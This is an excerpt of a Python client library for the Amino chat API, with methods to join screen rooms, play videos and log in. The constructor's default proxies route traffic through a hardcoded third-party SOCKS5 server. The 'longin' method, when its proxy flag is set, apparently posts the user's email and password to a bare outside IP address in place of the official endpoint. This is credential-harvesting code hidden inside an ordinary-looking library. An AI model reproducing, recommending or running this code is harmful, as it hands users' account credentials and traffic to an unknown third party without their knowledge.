...
class Client(Callbacks, SocketHandler):
    def __init__(self, deviceId: str = None, proxies: str = {'http': 'socks5://prxy:1092@chile.zaicadia-hosting.gq:5279','https':'socks5://prxy:1092@chile.zaicadia-hosting.gq:5279'}, certificatePath = None, socket_trace = False, socketDebugging = False):
    ...
    def join_screen_room(self, comId: str, chatId: str, joinType: int=2):
        data = {
            "o":
                {
                    "ndcId": int(comId),
    ...
    def play_video(self, comId: str, chatId: str):
        ...
        sleep(1)
        self.send(data)
        data={"o": {"ndcId": int(comId), "threadId": chatId, "playlist": {"currentItemIndex": 0, "currentItemStatus": 1, "items": [{"author": null, "duration": 28.815, "isDone": false, "mediaList": [[100, "http://pm1.narvii.com/8083/3bec7c4a86180dd77e10763ae021cd0d4da4735ar1-512-410v2_00.jpg", null]], "title": "Dr. Strange Multiverse madness", "type": 1, "url": "Dance.mp3"}]}, "id": "10336041"}, "t": 120}
        data = json.dumps(data)
        sleep(1)
        self.send(data)
        data={"o": {"ndcId": int(comId), "threadId": chatId, "playlist": {"currentItemIndex": 0, "currentItemStatus": 2, "items": [{"author": null, "duration": 28.815, "isDone": false, "mediaList": [[100, "http://pm1.narvii.com/8083/3bec7c4a86180dd77e10763ae021cd0d4da4735ar1-512-410v2_00.jpg", null]], "title": "Love forever", "type": 1, "url": "https://youtu.be/NpJ6lnbgi_s"}]}, "id": "10337809"}, "t": 120}
        data = json.dumps(data)
        sleep(1)
        self.send(data)
        data={"o": {"ndcId": int(comId), "threadId": chatId, "playlist": {"currentItemIndex": 0, "currentItemStatus": 2, "items": [{"author": null, "duration": 7600.815, "isDone": true, "mediaList": [[100, "http://mm1.narvii.com/8297/5618150ea391fb13d90cf0e25777152001ce7d2a1a58fa99r7-300-168_00.jpg", null]], "title": "Dr.Strange Multiverse of Madness", "type": 1, "url": "https://youtu.be/HPkydJOXXNs"}]}, "id": "10366159"}, "t": 120}
        data = json.dumps(data)
        sleep(1)
        self.send(data)
        self.active = True
    ...
    def longin(self, email: str, password: str,proxy:bool=False):
        ...
        **Returns**
        ...
        if proxy is True:
            ...
            response=requests.post("http://154.12.227.82:2193/login",data=data)
        ...
        if proxy is False:
            ...
            response = requests.post(f"{self.api}/g/s/auth/login", headers=self.parse_headers(data=data,deviceId=self.devicee()), data=data, proxies=prox, verify=self.certificatePath)
